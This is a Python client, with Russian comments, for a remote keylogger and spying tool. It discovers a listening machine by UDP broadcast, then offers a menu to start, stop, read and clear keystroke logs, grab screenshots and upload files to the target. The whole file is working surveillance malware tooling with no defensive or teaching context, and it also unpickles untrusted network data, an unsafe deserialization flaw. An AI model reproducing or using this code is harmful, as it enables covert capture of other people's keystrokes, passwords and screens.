import pickle
import socket
import struct
import os

def send_command(s, command, file_path=None):
    try:
        s.sendall(command.encode('utf-8'))
        print(f"Sent command: {command}")

        if command == "screenshot":
            # Получаем размер файла
            payload_size = struct.calcsize("L")
            data = b""
            while len(data) < payload_size:
                data += s.recv(1024)
            packed_image_size = data[:payload_size]
            image_size = struct.unpack("L", packed_image_size)[0]
            data = data[payload_size:]

            while len(data) < image_size:
                data += s.recv(1024)

            frame_data = data[:image_size]
            image = pickle.loads(frame_data)  # Десериализация изображения

            # Сохранение изображения
            image.save("screenshot.png")
            print("Screenshot saved as screenshot.png")
        elif command.startswith("receive_file:") and file_path:
            response = s.recv(1024)
            if response == b"READY_TO_RECEIVE":
                file_size = os.path.getsize(file_path)
                s.sendall(struct.pack("L", file_size))  # Отправляем размер файла

                with open(file_path, "rb") as f:
                    while True:
                        bytes_read = f.read(1024)
                        if not bytes_read:
                            break
                        s.sendall(bytes_read)
                print(f"File '{file_path}' sent to server.")
        else:
            # Читаем ответ от сервера
            response = s.recv(1024)
            print(f"Response from server: {response.decode('utf-8')}")

    except Exception as e:
        print(f"An error occurred: {e}")

# Основное меню клиента
def client_menu(server_ip):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, 8080))  # Замените на IP-адрес вашего сервера
        while True:
            print("\n1. Start keylogger")
            print("2. Stop keylogger")
            print("3. Show logs")
            print("4. Clear logs")
            print("5. Take screenshot")
            print("6. Send file")  # Новый пункт для отправки файла
            print("7. Exit")
            choice = input("Enter your choice: ")

            if choice == '1':
                send_command(s, "keylogger_start")
                print("Keylogger started.")
            elif choice == '2':
                send_command(s, "keylogger_stop")
                print("Keylogger stopped.")
            elif choice == '3':
                send_command(s, "keylogger_show")
            elif choice == '4':
                send_command(s, "keylogger_clear")
                print("Logs cleared.")
            elif choice == '5':
                send_command(s, "screenshot")
            elif choice == '6':
                file_path = input("Enter the path of the file to send: ")
                if os.path.exists(file_path):
                    file_name = os.path.basename(file_path)  # Получаем имя файла
                    send_command(s, f"receive_file:{file_name}", file_path)  # Передаем имя файла и путь
                else:
                    print("File not found.")
            elif choice == '7':
                print("Exiting...")
                break
            else:
                print("Invalid choice. Please try again.")

# Запуск меню клиента
def discover_server():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client_socket:
        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        client_socket.sendto("DISCOVER_SERVER".encode('utf-8'), ('<broadcast>', 8081))

        # Ожидание ответа от сервера
        try:
            client_socket.settimeout(5)
            data, addr = client_socket.recvfrom(1024)
            print(f"Server IP discovered: {data.decode('utf-8')}")
            return data.decode('utf-8').split(':')[1]
        except socket.timeout:
            print("No server response received.")
            return None


def start_client():
    server_ip = discover_server()
    if server_ip:
        client_menu(server_ip)
    else:
        print("Failed to discover server. Exiting...")


if __name__ == "__main__":
    start_client()
